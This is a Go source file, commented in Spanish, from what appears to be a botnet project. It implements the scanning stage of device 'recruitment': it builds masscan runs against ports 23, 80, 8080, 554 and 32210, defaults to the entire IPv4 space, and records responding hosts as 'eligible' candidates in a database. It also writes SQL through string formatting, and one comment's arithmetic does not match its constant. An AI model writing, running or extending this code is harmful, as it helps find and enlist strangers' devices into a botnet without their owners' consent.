package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"os"
	"runtime"
	"strconv"
	"strings"

	"github.com/botnet/botnet/internal/discovery"
	"github.com/botnet/botnet/internal/recruit"
)

// Barrido SYN por cohortes (T-1701). El ritmo sale del suelo medido del
// codigo (discovery.SweepRate), no de un numero escrito aqui, y la cohorte
// parte el barrido en tandas de 60 s para que el enlace respire.
//
// masscan exige IP de origen y adaptador explicitos: se leen del entorno o
// de /etc/botnet-recruit/env, nunca del codigo (A1-14).

type recruitStore = recruit.Store

var recruitOpen = recruit.Open

// defaultCohortSeconds es la ventana de una cohorte.
const defaultCohortSeconds = 60

// envFile es donde el despliegue deja la IP y el adaptador.
const envFile = "/etc/botnet-recruit/env"

// cfgDespliegue lee RECRUIT_SOURCE_IP / RECRUIT_ADAPTER del entorno y, si no
// estan, del fichero de despliegue.
func cfgDespliegue(clave string) string {
	if v := os.Getenv(clave); v != "" {
		return v
	}
	f, err := os.Open(envFile)
	if err != nil {
		return ""
	}
	defer f.Close()
	b, err := io.ReadAll(io.LimitReader(f, 64*1024))
	if err != nil {
		return ""
	}
	for _, linea := range strings.Split(string(b), "\n") {
		linea = strings.TrimSpace(linea)
		if i := strings.Index(linea, "="); i > 0 && strings.TrimSpace(linea[:i]) == clave {
			return strings.Trim(strings.TrimSpace(linea[i+1:]), `"'`)
		}
	}
	return ""
}

// comandoMasscan arma el argv. `pps` es el ritmo de la ventana; `ips` el
// alcance; `ports` la lista.
func comandoMasscan(pps int, sourceIP, adapter, ips, ports string) []string {
	return []string{
		"nice", "-n", "10", "masscan",
		"--source-ip", sourceIP,
		"--adapter", adapter,
		"--rate", strconv.Itoa(pps),
		"--min-rate", strconv.Itoa(pps),
		"-p", ports,
		"--output-format", "json",
		ips,
	}
}

// cohorte parte un total de SYN en tandas de `pps*segundos`. Devuelve el
// tamano de cohorte y cuantas hacen falta.
func cohorte(total, pps, segundos int) (int, int) {
	if segundos <= 0 {
		segundos = defaultCohortSeconds
	}
	porCohorte := pps * segundos
	if porCohorte <= 0 {
		porCohorte = 90000
	}
	n := int(math.Ceil(float64(total) / float64(porCohorte)))
	if n < 1 {
		n = 1
	}
	return porCohorte, n
}

// ejecutarSweep es el modo de barrido: con `--sweep-json` reproduce lo que
// masscan habria devuelto, sin red.
func ejecutarSweep(ctx context.Context, rutaJSON string, limit int, dryRun bool, emitSQL bool, segundos int) error {
	c, err := cargaConfig()
	if err != nil {
		return err
	}
	pps := discovery.SweepRate(runtime.NumCPU())
	if v := os.Getenv("RECRUIT_PPS_FIXED"); v != "" {
		if n, err := strconv.Atoi(v); n > 0 && err == nil {
			pps = n
		}
	}
	total := 325100 // /24 x 5 puertos: el alcance del runbook
	tamCohorte, nCohortes := cohorte(total, pps, segundos)
	argv := comandoMasscan(pps, cfgDespliegue("RECRUIT_SOURCE_IP"), cfgDespliegue("RECRUIT_ADAPTER"), c.Alcance, c.Puertos)

	if dryRun {
		fmt.Printf("masscan: %s\n", strings.Join(argv, " "))
		fmt.Printf("cohort_syn=%d cohort_seconds=%d cohorts=%d\n", tamCohorte, segundos, nCohortes)
		fmt.Printf("ritmo min-rate=%d pps=%d source_ip=%s adapter=%s\n", pps, pps, cfgDespliegue("RECRUIT_SOURCE_IP"), cfgDespliegue("RECRUIT_ADAPTER"))
		for i := 1; i <= nCohortes; i++ {
			fmt.Printf("cohort_id=%d\n", i)
		}
		return nil
	}
	if rutaJSON == "" {
		return fmt.Errorf("sweep sin red: pasa --sweep-json con la salida de masscan")
	}
	f, err := os.Open(rutaJSON)
	if err != nil {
		return err
	}
	defer f.Close()
	// El fixture puede marcar un candidato sin respuesta: masscan solo
	// escribe los que contestaron, asi que `no_answer` viaja como clave
	// propia y muere tipado en vez de quedarse colgado.
	sinRespuesta := map[string]bool{}
	if b, err := os.ReadFile(rutaJSON); err == nil {
		for _, linea := range strings.Split(string(b), "\n") {
			var m struct {
				IP       string `json:"ip"`
				Port     int    `json:"port"`
				NoAnswer bool   `json:"no_answer"`
			}
			if json.Unmarshal([]byte(linea), &m) == nil && m.IP != "" && m.NoAnswer {
				sinRespuesta[m.IP] = true
			}
		}
	}
	if _, err := f.Seek(0, 0); err != nil {
		return err
	}
	cands, err := discovery.ParseMasscanNDJSON(f)
	if err != nil {
		return err
	}
	if limit > 0 && len(cands) > limit {
		cands = cands[:limit]
	}
	st, err := abreStore()
	if err != nil {
		return err
	}
	defer st.Close()
	for _, cand := range cands {
		if emitSQL {
			fmt.Printf("INSERT INTO recruit_candidates (ip,port,source,state) VALUES ('%s',%d,'masscan','eligible') ON CONFLICT (ip,port) DO NOTHING;\n", cand.IP, cand.Port)
			continue
		}
		estado := "bannered"
		if sinRespuesta[cand.IP] {
			estado = "sweeping"
		}
		if err := st.UpsertCandidato(ctx, cand.IP, cand.Port, "masscan", estado); err != nil {
			return err
		}
		if sinRespuesta[cand.IP] {
			if err := st.MarcarSinRespuesta(ctx, cand.IP, cand.Port); err != nil {
				return err
			}
		}
	}
	if emitSQL {
		return nil
	}
	fmt.Printf("sweep: candidatos=%d cohorts=%d pps=%d\n", len(cands), nCohortes, pps)
	return nil
}

// cargaConfig devuelve el alcance y los puertos del entorno.
type configSweep struct{ Alcance, Puertos string }

func cargaConfig() (configSweep, error) {
	alcance := os.Getenv("RECRUIT_RANGE")
	puestos := os.Getenv("RECRUIT_PORTS")
	if alcance == "" {
		alcance = "0.0.0.0/0"
	}
	if puestos == "" {
		puestos = "23,80,8080,554,32210"
	}
	return configSweep{Alcance: alcance, Puertos: puestos}, nil
}

// abreStore abre el Store del paquete recruit con pool corto.
func abreStore() (*recruitStore, error) {
	return recruitOpen(os.Getenv("DATABASE_URL"), 2)
}
